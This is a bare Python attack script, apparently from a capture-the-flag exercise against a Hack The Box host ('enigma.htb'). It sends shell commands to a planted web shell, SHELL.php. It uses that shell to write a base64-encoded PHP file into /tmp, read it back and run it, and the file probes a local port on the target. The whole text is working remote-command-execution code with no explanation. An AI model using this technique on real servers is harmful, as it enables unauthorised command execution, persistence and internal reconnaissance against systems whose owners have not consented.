import urllib.request, urllib.parse, base64

php_code = b"<?php\n" + b"\x24s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\nsocket_set_option(\x24s, SOL_SOCKET, SO_SNDTIMEO, ['sec'=>2, 'usec'=>0]);\n\x24r = @socket_connect(\x24s, '127.0.0.1', 1337);\necho 'Result: ' . var_export(\x24r, true) . ' Error: ' . socket_strerror(socket_last_error()) . '\n';\nsocket_close(\x24s);\n?>"

encoded = base64.b64encode(php_code).decode()
cmd = "echo " + encoded + " | base64 -d > /tmp/stest.php"
url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
headers = {"Host": "support_001.enigma.htb"}
req = urllib.request.Request(url, headers=headers)
resp = urllib.request.urlopen(req, timeout=10)
print("Write:", resp.read().decode("utf-8", errors="replace").strip()[:200])

cmd2 = "cat /tmp/stest.php"
url2 = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd2})
req2 = urllib.request.Request(url2, headers=headers)
resp2 = urllib.request.urlopen(req2, timeout=10)
print("Content:", repr(resp2.read().decode("utf-8", errors="replace").strip()[:200]))

cmd3 = "php /tmp/stest.php"
url3 = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd3})
req3 = urllib.request.Request(url3, headers=headers)
resp3 = urllib.request.urlopen(req3, timeout=15)
print("Run:", resp3.read().decode("utf-8", errors="replace").strip()[:500])
